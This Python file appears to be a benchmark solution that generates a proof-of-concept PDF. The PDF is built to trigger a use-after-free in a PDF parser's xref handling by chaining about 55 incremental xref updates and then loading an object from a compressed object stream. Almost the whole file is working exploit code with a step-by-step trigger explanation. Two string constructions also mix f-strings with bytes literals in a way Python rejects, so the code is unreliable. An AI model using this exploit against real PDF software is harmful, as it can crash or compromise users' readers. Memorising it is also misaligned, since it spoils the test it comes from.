import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a use-after-free on a `pdf_xref_entry` pointer. It occurs
        when a pointer is held across a call that can cause the xref table to be
        reallocated (a process called "solidification"). This happens specifically
        when loading a compressed object from an object stream.

        The PoC constructs a PDF with a highly fragmented cross-reference table. This is
        achieved by creating many incremental updates, each adding a single dummy object
        and its own xref section. This fragmentation is designed to trigger the
        solidification logic within the PDF parser.

        The PoC's structure is as follows:
        1. A standard PDF header and initial objects (Catalog, Pages).
        2. A Page object that refers to a compressed object (object 4) for its Annots.
        3. A long chain of ~55 incremental updates. Each update adds a dummy object and
           a new xref section linked to the previous one via the `/Prev` trailer key.
           This creates the required fragmentation.
        4. A final incremental update that contains:
           a. An Object Stream (`ObjStm`) which holds the compressed content for object 4.
           b. An XRef Stream (`/Type /XRef`) which is a modern xref format necessary
              to define compressed objects. This stream defines object 4 as compressed
              and points it to the Object Stream.

        Triggering sequence:
        1. The parser is asked to render the Page (object 3).
        2. It parses object 3 and finds the reference to the annotation (object 4).
        3. It attempts to load object 4. The xref entry (from the final XRef Stream)
           indicates object 4 is compressed within the Object Stream.
        4. The parser calls a function to load from the object stream. This function
           first gets a pointer to the xref entry for object 4.
        5. To read the compressed object, the parser must first load the Object Stream
           itself. This involves a recursive call to `pdf_load_object`.
        6. During this recursive call, the parser's internal logic detects the highly
           fragmented xref table and decides to "solidify" it, merging all sections
           into a single new table and freeing the old ones.
        7. The original pointer to object 4's xref entry is now dangling.
        8. After the recursive call returns, the function continues and uses the
           dangling pointer to get the object's index within the stream, resulting
           in a use-after-free crash.
        """
        num_dummy_updates = 55

        pdf_parts = []
        offsets = {}

        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        pdf_parts.append(header)
        current_offset = len(header)

        obj1_str = b"1 0 obj\n<</Type/Catalog/Pages 2 0 R>>\nendobj\n"
        offsets[1] = current_offset
        pdf_parts.append(obj1_str)
        current_offset += len(obj1_str)

        obj2_str = b"2 0 obj\n<</Type/Pages/Kids[3 0 R]/Count 1>>\nendobj\n"
        offsets[2] = current_offset
        pdf_parts.append(obj2_str)
        current_offset += len(obj2_str)

        xref0_offset = current_offset
        xref0_str = (
            b"xref\n0 3\n0000000000 65535 f \n"
            f"{offsets[1]:010d} 00000 n \n".encode('ascii') +
            f"{offsets[2]:010d} 00000 n \n".encode('ascii')
        )
        pdf_parts.append(xref0_str)
        current_offset += len(xref0_str)

        trailer0_str = b"trailer\n<</Size 3/Root 1 0 R>>\n"
        pdf_parts.append(trailer0_str)
        current_offset += len(trailer0_str)

        startxref0_str = f"startxref\n{xref0_offset}\n%%EOF\n".encode('ascii')
        pdf_parts.append(startxref0_str)
        current_offset += len(startxref0_str)

        prev_xref_offset = xref0_offset

        obj3_str = b"3 0 obj\n<</Type/Page/Annots[4 0 R]>>\nendobj\n"
        offsets[3] = current_offset
        pdf_parts.append(obj3_str)
        current_offset += len(obj3_str)

        xref1_offset = current_offset
        xref1_str = b"xref\n3 1\n" + f"{offsets[3]:010d} 00000 n \n".encode('ascii')
        pdf_parts.append(xref1_str)
        current_offset += len(xref1_str)
        
        trailer1_str = f"trailer\n<</Size 4/Prev {prev_xref_offset}>>\n".encode('ascii')
        pdf_parts.append(trailer1_str)
        current_offset += len(trailer1_str)

        startxref1_str = f"startxref\n{xref1_offset}\n%%EOF\n".encode('ascii')
        pdf_parts.append(startxref1_str)
        current_offset += len(startxref1_str)

        prev_xref_offset = xref1_offset
        
        start_obj_num = 5
        for i in range(num_dummy_updates):
            obj_num = start_obj_num + i
            dummy_obj_str = f"{obj_num} 0 obj\n(d{i})\nendobj\n".encode('ascii')
            
            offsets[obj_num] = current_offset
            pdf_parts.append(dummy_obj_str)
            current_offset += len(dummy_obj_str)
            
            xref_offset = current_offset
            xref_str = f"xref\n{obj_num} 1\n{offsets[obj_num]:010d} 00000 n \n".encode('ascii')
            pdf_parts.append(xref_str)
            current_offset += len(xref_str)
            
            trailer_str = f"trailer\n<</Size {obj_num + 1}/Prev {prev_xref_offset}>>\n".encode('ascii')
            pdf_parts.append(trailer_str)
            current_offset += len(trailer_str)

            startxref_str = f"startxref\n{xref_offset}\n%%EOF\n".encode('ascii')
            pdf_parts.append(startxref_str)
            current_offset += len(startxref_str)
            
            prev_xref_offset = xref_offset

        obj_stm_num = start_obj_num + num_dummy_updates
        compressed_obj_num = 4

        compressed_obj_content = b"<</Type/Annot/Subtype/Text/Rect[0 0 1 1]/Contents(PoC)>>"
        obj_stm_header = f"{compressed_obj_num} 0 ".encode('ascii')
        obj_stm_payload = obj_stm_header + compressed_obj_content
        
        obj_stm_str = (
            f"{obj_stm_num} 0 obj\n"
            f"<</Type/ObjStm/N 1/First {len(obj_stm_header)}/Length {len(obj_stm_payload)}>>\n"
            b"stream\n"
        ).encode('ascii') + obj_stm_payload + b"\nendstream\nendobj\n"

        offsets[obj_stm_num] = current_offset
        pdf_parts.append(obj_stm_str)
        current_offset += len(obj_stm_str)

        xref_stm_num = obj_stm_num + 1
        final_size = xref_stm_num + 1

        entry4 = b'\x02' + obj_stm_num.to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        entry_obj_stm = b'\x01' + offsets[obj_stm_num].to_bytes(4, 'big') + (0).to_bytes(2, 'big')
        xref_stm_payload = entry4 + entry_obj_stm
        compressed_xref_payload = zlib.compress(xref_stm_payload)

        xref_stm_dict_str = (
            f"<</Type/XRef/Size {final_size}/Root 1 0 R/Prev {prev_xref_offset} "
            f"/W [1 4 2] "
            f"/Index [{compressed_obj_num} 1 {obj_stm_num} 1] "
            f"/Length {len(compressed_xref_payload)}/Filter/FlateDecode>>"
        )

        xref_stm_obj = (
            f"{xref_stm_num} 0 obj\n"
            f"{xref_stm_dict_str}\n"
            b"stream\n"
        ).encode('ascii') + compressed_xref_payload + b"\nendstream\nendobj\n"
        
        offsets[xref_stm_num] = current_offset
        pdf_parts.append(xref_stm_obj)
        current_offset += len(xref_stm_obj)
        
        final_trailer_str = (
            f"startxref\n"
            f"{offsets[xref_stm_num]}\n"
            b"%%EOF\n"
        )
        pdf_parts.append(final_trailer_str.encode('ascii'))
        
        return b"".join(pdf_parts)
